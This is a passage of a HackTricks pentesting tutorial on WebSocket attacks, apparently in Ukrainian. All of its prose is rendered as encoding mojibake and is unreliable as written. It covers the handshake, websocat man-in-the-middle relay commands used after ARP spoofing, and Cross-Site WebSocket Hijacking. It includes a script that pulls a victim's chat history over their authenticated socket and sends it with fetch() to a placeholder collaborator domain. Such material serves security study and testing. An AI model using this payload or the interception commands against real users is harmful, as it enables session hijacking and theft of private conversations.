# –ê—Ç–∞–∫–∏ –Ω–∞ WebSocket

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## –©–æ —Ç–∞–∫–µ WebSockets

–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è WebSocket –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—Ç—å—Å—è —á–µ—Ä–µ–∑ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π **HTTP** —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è —ñ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—ñ –¥–ª—è **–¥–æ–≤–≥–æ—Å—Ç—Ä–æ–∫–æ–≤–æ–≥–æ** –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è, —â–æ –¥–æ–∑–≤–æ–ª—è—î –±—ñ–¥–∏—Ä–µ–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—É –ø–µ—Ä–µ–¥–∞—á—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —É –±—É–¥—å-—è–∫–∏–π –º–æ–º–µ–Ω—Ç –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ —É —Ç—Ä–∞–Ω–∑–∞–∫—Ü—ñ–π–Ω—ñ–π —Å–∏—Å—Ç–µ–º—ñ. –¶–µ —Ä–æ–±–∏—Ç—å WebSockets –æ—Å–æ–±–ª–∏–≤–æ –≤–∏–≥—ñ–¥–Ω–∏–º–∏ –¥–ª—è –∑–∞—Å—Ç–æ—Å—É–Ω–∫—ñ–≤, —è–∫—ñ –≤–∏–º–∞–≥–∞—é—Ç—å **–Ω–∏–∑—å–∫–æ—ó –∑–∞—Ç—Ä–∏–º–∫–∏ –∞–±–æ —Å–µ—Ä–≤–µ—Ä–Ω–æ-—ñ–Ω—ñ—Ü—ñ–π–æ–≤–∞–Ω–æ—ó –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó**, —Ç–∞–∫–∏—Ö —è–∫ –ø–æ—Ç–æ–∫–∏ –∂–∏–≤–∏—Ö —Ñ—ñ–Ω–∞–Ω—Å–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö.

### –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—ñ–¥–∫–ª—é—á–µ–Ω—å WebSocket

–î–µ—Ç–∞–ª—å–Ω–µ –ø–æ—è—Å–Ω–µ–Ω–Ω—è —â–æ–¥–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—ñ–¥–∫–ª—é—á–µ–Ω—å WebSocket –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [**—Ç—É—Ç**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). –£ –∫—Ä–∞—Ç—Ü—ñ, –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è WebSocket –∑–∞–∑–≤–∏—á–∞–π —ñ–Ω—ñ—Ü—ñ—é—é—Ç—å—Å—è —á–µ—Ä–µ–∑ JavaScript –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂—á–µ:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
–ü—Ä–æ—Ç–æ–∫–æ–ª `wss` –ø–æ–∑–Ω–∞—á–∞—î –±–µ–∑–ø–µ—á–Ω–µ –∑'—î–¥–Ω–∞–Ω–Ω—è WebSocket –∑ **TLS**, —Ç–æ–¥—ñ —è–∫ `ws` –≤–∫–∞–∑—É—î –Ω–∞ **–Ω–µ–∑–∞—Ö–∏—â–µ–Ω–µ** –∑'—î–¥–Ω–∞–Ω–Ω—è.

–ü—ñ–¥ —á–∞—Å –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑'—î–¥–Ω–∞–Ω–Ω—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è –º—ñ–∂ –±—Ä–∞—É–∑–µ—Ä–æ–º —Ç–∞ —Å–µ—Ä–≤–µ—Ä–æ–º —á–µ—Ä–µ–∑ HTTP. –ü—Ä–æ—Ü–µ—Å —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è –≤–∫–ª—é—á–∞—î –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∑–∞–ø–∏—Ç—É –±—Ä–∞—É–∑–µ—Ä–æ–º —Ç–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å —Å–µ—Ä–≤–µ—Ä–∞, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –ø—Ä–∏–∫–ª–∞–¥–∞—Ö:

–ë—Ä–∞—É–∑–µ—Ä –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
–í—ñ–¥–ø–æ–≤—ñ–¥—å —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è —Å–µ—Ä–≤–µ—Ä–∞:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –≤—ñ–¥–∫—Ä–∏—Ç–∏–º –¥–ª—è –æ–±–º—ñ–Ω—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è–º–∏ —É –æ–±–æ—Ö –Ω–∞–ø—Ä—è–º–∫–∞—Ö –ø—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è.

**–û—Å–Ω–æ–≤–Ω—ñ –º–æ–º–µ–Ω—Ç–∏ —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è WebSocket:**

- –ó–∞–≥–æ–ª–æ–≤–∫–∏ `Connection` —Ç–∞ `Upgrade` —Å–∏–≥–Ω–∞–ª—ñ–∑—É—é—Ç—å –ø—Ä–æ –ø–æ—á–∞—Ç–æ–∫ —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è WebSocket.
- –ó–∞–≥–æ–ª–æ–≤–æ–∫ `Sec-WebSocket-Version` –≤–∫–∞–∑—É—î –Ω–∞ –±–∞–∂–∞–Ω—É –≤–µ—Ä—Å—ñ—é –ø—Ä–æ—Ç–æ–∫–æ–ª—É WebSocket, –∑–∞–∑–≤–∏—á–∞–π `13`.
- –í –∑–∞–≥–æ–ª–æ–≤–∫—É `Sec-WebSocket-Key` –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –≤–∏–ø–∞–¥–∫–æ–≤–µ –∑–Ω–∞—á–µ–Ω–Ω—è, –∑–∞–∫–æ–¥–æ–≤–∞–Ω–µ Base64, —â–æ –≥–∞—Ä–∞–Ω—Ç—É—î —É–Ω—ñ–∫–∞–ª—å–Ω—ñ—Å—Ç—å –∫–æ–∂–Ω–æ–≥–æ —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è, —â–æ –¥–æ–ø–æ–º–∞–≥–∞—î —É–Ω–∏–∫–Ω—É—Ç–∏ –ø—Ä–æ–±–ª–µ–º –∑ –∫–µ—à—É—é—á–∏–º–∏ –ø—Ä–æ–∫—Å—ñ. –¶–µ –∑–Ω–∞—á–µ–Ω–Ω—è –Ω–µ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–µ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –∞ –ª–∏—à–µ –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —Ç–æ–≥–æ, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–µ –≥–µ–Ω–µ—Ä—É—î—Ç—å—Å—è –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–º —Å–µ—Ä–≤–µ—Ä–æ–º –∞–±–æ –∫–µ—à–µ–º.
- –ó–∞–≥–æ–ª–æ–≤–æ–∫ `Sec-WebSocket-Accept` —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Å–µ—Ä–≤–µ—Ä–∞ —î —Ö–µ—à–µ–º `Sec-WebSocket-Key`, —â–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î –Ω–∞–º—ñ—Ä —Å–µ—Ä–≤–µ—Ä–∞ –≤—ñ–¥–∫—Ä–∏—Ç–∏ –∑'—î–¥–Ω–∞–Ω–Ω—è WebSocket.

–¶—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –∑–∞–±–µ–∑–ø–µ—á—É—é—Ç—å –±–µ–∑–ø–µ—á–Ω–∏–π —Ç–∞ –Ω–∞–¥—ñ–π–Ω–∏–π –ø—Ä–æ—Ü–µ—Å —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è, –≤—ñ–¥–∫—Ä–∏–≤–∞—é—á–∏ —à–ª—è—Ö –¥–ª—è –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–≥–æ —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ.


### –ö–æ–Ω—Å–æ–ª—å Linux

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `websocat`, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø—Ä—è–º–µ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑ WebSocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
–ê–±–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Å–µ—Ä–≤–µ—Ä websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### –ê—Ç–∞–∫–∏ –Ω–∞ –ø—Ä–æ–º—ñ–∂–Ω–∏–π —á–∞—Å websocket

–Ø–∫—â–æ –≤–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ –∫–ª—ñ—î–Ω—Ç–∏ –ø—ñ–¥–∫–ª—é—á–µ–Ω—ñ –¥–æ **HTTP websocket** –∑ –≤–∞—à–æ—ó –ø–æ—Ç–æ—á–Ω–æ—ó –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing), —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫—É –Ω–∞ –ø—Ä–æ–º—ñ–∂–Ω–∏–π —á–∞—Å –º—ñ–∂ –∫–ª—ñ—î–Ω—Ç–æ–º —Ç–∞ —Å–µ—Ä–≤–µ—Ä–æ–º.\
–ü—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –∫–ª—ñ—î–Ω—Ç –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ –≤–∞—Å, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### –ü–µ—Ä–µ–ª—ñ–∫ –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **—ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **–¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è, –≤—ñ–¥–±–∏—Ç–∫—ñ–≤ —Ç–∞ –ø–æ—à—É–∫—É –≤—ñ–¥–æ–º–∏—Ö** **–≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π** –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ.

### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤

* **Burp Suite** –ø—ñ–¥—Ç—Ä–∏–º—É—î MitM –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—é –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤ –¥—É–∂–µ —Å—Ö–æ–∂–∏–º —á–∏–Ω–æ–º, —è–∫ –≤—ñ–Ω —Ü–µ —Ä–æ–±–∏—Ç—å –¥–ª—è –∑–≤–∏—á–∞–π–Ω–æ—ó –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó HTTP.
* –†–æ–∑—à–∏—Ä–µ–Ω–Ω—è **socketsleuth** –¥–ª—è **Burp Suite** –¥–æ–∑–≤–æ–ª–∏—Ç—å –≤–∞–º –∫—Ä–∞—â–µ –∫–µ—Ä—É–≤–∞—Ç–∏ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—î—é –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤ –≤ Burp, –æ—Ç—Ä–∏–º—É—é—á–∏ **—ñ—Å—Ç–æ—Ä—ñ—é**, –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—á–∏ **–ø—Ä–∞–≤–∏–ª–∞ –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–∞–≤–∏–ª–∞ **–≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ —Ç–∞ –∑–∞–º—ñ–Ω–∏**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **Intruder** —Ç–∞ **AutoRepeater.**
* **WSSiP** (—Å–∫–æ—Ä–æ—á–µ–Ω–æ –≤—ñ–¥ "**WebSocket/Socket.io Proxy**") - —Ü–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, –Ω–∞–ø–∏—Å–∞–Ω–∏–π –Ω–∞ Node.js, –Ω–∞–¥–∞—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è **–∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è, –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è, –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏—Ö** –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —Ç–∞ –ø–µ—Ä–µ–≥–ª—è–¥—É –≤—Å—ñ—Ö –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ–π WebSocket —Ç–∞ Socket.IO –º—ñ–∂ –∫–ª—ñ—î–Ω—Ç–æ–º —Ç–∞ —Å–µ—Ä–≤–µ—Ä–æ–º.
* **wsrepl** - —Ü–µ **—ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∏–π websocket REPL**, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è. –í—ñ–Ω –Ω–∞–¥–∞—î —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è —Å–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—è –∑–∞ **–≤—Ö—ñ–¥–Ω–∏–º–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è–º–∏ –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤ —Ç–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –Ω–æ–≤–∏—Ö**, –∑ –ø—Ä–æ—Å—Ç–æ—é —É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ —Å—Ç—Ä—É–∫—Ç—É—Ä–æ—é –¥–ª—è **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó** —Ü—ñ—î—ó –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó.
* [**https://websocketking.com/**](https://websocketking.com/) - —Ü–µ **–≤–µ–± –¥–ª—è –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó** –∑ —ñ–Ω—à–∏–º–∏ –≤–µ–±-—Å–∞–π—Ç–∞–º–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) —Å–µ—Ä–µ–¥ —ñ–Ω—à–∏—Ö —Ç–∏–ø—ñ–≤ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ–π/–ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤, —Ü–µ –Ω–∞–¥–∞—î **–≤–µ–± –¥–ª—è –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó** –∑ —ñ–Ω—à–∏–º–∏ –≤–µ–±-—Å–∞–π—Ç–∞–º–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤**.

## –õ–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ—è –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤

–£ [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) —î –∫–æ–¥ –¥–ª—è –∑–∞–ø—É—Å–∫—É –≤–µ–±-—Å–∞–π—Ç—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤, –∞ –≤ [**—Ü—ñ–π –ø—É–±–ª—ñ–∫–∞—Ü—ñ—ó**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –ø–æ—è—Å–Ω–µ–Ω–Ω—è.

## –ü–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤ –º—ñ–∂—Å–∞–π—Ç–æ–≤–æ–≥–æ –≤–∏–∫—Ä–∞–¥–µ–Ω–Ω—è (CSWSH)

**–ü–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤ –º—ñ–∂—Å–∞–π—Ç–æ–≤–æ–≥–æ –≤–∏–∫—Ä–∞–¥–µ–Ω–Ω—è**, —Ç–∞–∫–æ–∂ –≤—ñ–¥–æ–º–µ —è–∫ **–ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤ –º—ñ–∂ –¥–∂–µ—Ä–µ–ª–∞–º–∏**, —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è —è–∫ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –≤–∏–ø–∞–¥–æ–∫ **[–ü—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ –º—ñ–∂—Å–∞–π—Ç–æ–≤–æ–≥–æ —Ç–∏–ø—É (CSRF)](csrf-cross-site-request-forgery.md)**, —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤. –¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—é—Ç—å—Å—è –≤–∏–∫–ª—é—á–Ω–æ —á–µ—Ä–µ–∑ **HTTP cookies** –±–µ–∑ **—Ç–æ–∫–µ–Ω—ñ–≤ CSRF** –∞–±–æ –ø–æ–¥—ñ–±–Ω–∏—Ö –∑–∞—Ö–æ–¥—ñ–≤ –±–µ–∑–ø–µ–∫–∏.

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ, —Ä–æ–∑–º—ñ—Å—Ç–∏–≤—à–∏ **—à–∫—ñ–¥–ª–∏–≤—É –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫—É**, —è–∫–∞ —ñ–Ω—ñ—Ü—ñ—é—î –∑–≤'—è–∑–æ–∫ –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤ –º—ñ–∂ –¥–∂–µ—Ä–µ–ª–∞–º–∏ –∑ –≤—Ä–∞–∑–ª–∏–≤–æ—é –ø—Ä–æ–≥—Ä–∞–º–æ—é. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ —Ü–µ–π –∑–≤'—è–∑–æ–∫ —Ä–æ–∑–≥–ª—è–¥–∞—î—Ç—å—Å—è —è–∫ —á–∞—Å—Ç–∏–Ω–∞ —Å–µ–∞–Ω—Å—É –∂–µ—Ä—Ç–≤–∏ –∑ –ø—Ä–æ–≥—Ä–∞–º–æ—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –∑–∞—Ö–∏—Å—Ç—É CSRF –≤ –º–µ—Ö–∞–Ω—ñ–∑–º—ñ –æ–±—Ä–æ–±–∫–∏ —Å–µ–∞–Ω—Å—É.

### –ü—Ä–æ—Å—Ç–∞ –∞—Ç–∞–∫–∞

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –ø—Ä–∏ **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ñ** –∑'—î–¥–Ω–∞–Ω–Ω—è **–≤–µ–±—Å–æ–∫–µ—Ç—É** **cookie** –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä. **–°–µ—Ä–≤–µ—Ä** –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è **–ø–æ–≤'—è–∑–∞–Ω–Ω—è** –∫–æ–∂–Ω–æ–≥–æ **–∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ** **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –π–æ–≥–æ —Å–µ–∞–Ω—Å–æ–º –≤–µ–±—Å–æ–∫–µ—Ç—É –Ω–∞ –æ—Å–Ω–æ–≤—ñ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ–≥–æ cookie**.

–û—Ç–∂–µ, —è–∫—â–æ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, **—Å–µ—Ä–≤–µ—Ä –≤–µ–±—Å–æ–∫–µ—Ç—ñ–≤** **–Ω–∞–¥—Å–∏–ª–∞—î —ñ—Å—Ç–æ—Ä—ñ—é —Ä–æ–∑–º–æ–≤–∏** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫—â–æ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ "**READY"**, —Ç–æ **–ø—Ä–æ—Å—Ç–∏–π XSS**, —è–∫–∏–π –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î –∑'—î–¥–Ω–∞–Ω–Ω—è (**cookie** –±—É–¥–µ **–Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ** –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞-–∂–µ—Ä—Ç–≤–∏) **–Ω–∞–¥—Å–∏–ª–∞—é—á–∏** "**READY**", –∑–º–æ–∂–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏** —ñ—Å—Ç–æ—Ä—ñ—é **—Ä–æ–∑–º–æ–≤–∏**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### –ö—Ä–æ—Å-–ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è + –ö—É–∫–∏ –∑ —ñ–Ω—à–∏–º –ø—ñ–¥–¥–æ–º–µ–Ω–æ–º

